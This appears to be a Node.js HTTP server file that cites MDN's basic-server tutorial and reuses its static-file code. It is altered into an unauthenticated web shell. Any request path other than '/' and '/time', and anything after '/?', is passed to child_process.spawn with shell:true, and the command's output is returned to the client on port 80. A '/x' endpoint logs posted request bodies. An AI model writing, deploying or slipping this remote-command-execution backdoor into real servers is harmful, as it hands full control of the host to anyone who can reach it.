// https://developer.mozilla.org/en-US/docs/Learn/Server-side/Node_server_without_framework

var http = require('http');
var fs = require('fs');
var path = require('path');
var childprocess = require("child_process");

http.createServer(function (request, response) {

    var filePath = '.' + request.url;

    if (filePath == './') {
        filePath = './index.html';
        console.log(request.socket.remoteAddress);
    }

    else if (filePath == './time') {
        let date_ob = new Date();
        response.end(date_ob.toString());
        return;
    }

    else if (filePath.startsWith("./?")) {
        let cmd = filePath.slice(3);
        cmd = cmd.replaceAll("%20", " ");
        console.log("command: "+cmd);
        cmd = childprocess.spawn(cmd,{shell: true});
        cmd.stdout.on('data', (data) => {
            console.log(`stdout: ${data}`);
            response.writeHead(`${data}`);
        });
        return;
    }

    else {
        response.write("Running script\n\n");
        let cmd = filePath.slice(2);
        cmd = cmd.replaceAll("%20", " ");
        console.log("command: "+cmd);
        cmd = childprocess.spawn(cmd,{shell: true});
        cmd.stdout.on('data', (data) => {
            console.log(`stdout: ${data}`);
            response.write(`${data}\n`);
        });

        cmd.once("exit", () => {
            response.end("Finished");
        });
        return;
    }

    var extname = String(path.extname(filePath)).toLowerCase();
    var mimeTypes = {
        '.html': 'text/html',
        '.js': 'text/javascript',
        '.css': 'text/css',
        '.json': 'application/json',
        '.png': 'image/png',
        '.jpg': 'image/jpg',
        '.gif': 'image/gif',
        '.svg': 'image/svg+xml',
        '.wav': 'audio/wav',
        '.mp4': 'video/mp4',
        '.woff': 'application/font-woff',
        '.ttf': 'application/font-ttf',
        '.eot': 'application/vnd.ms-fontobject',
        '.otf': 'application/font-otf',
        '.wasm': 'application/wasm'
    };

    var contentType = mimeTypes[extname] || 'application/octet-stream';

    fs.readFile(filePath, function(error, content) {
        if (error) {
            if(error.code == 'ENOENT') {
                fs.readFile('./404.html', function(error, content) {
                    response.writeHead(404, { 'Content-Type': 'text/html' });
                    response.end(content, 'utf-8');
                });
            }
            else {
                response.writeHead(500);
                response.end('Sorry, check with the site admin for error: '+error.code+' ..\n');
            }
        }
        else {
            response.writeHead(200, { 'Content-Type': contentType });
            response.end(content, 'utf-8');
        }
    });







    request.on('data', (chunk) => {
        if (request.url == "/x") {
            console.log(chunk.toString());
        }
    });

}).listen(80);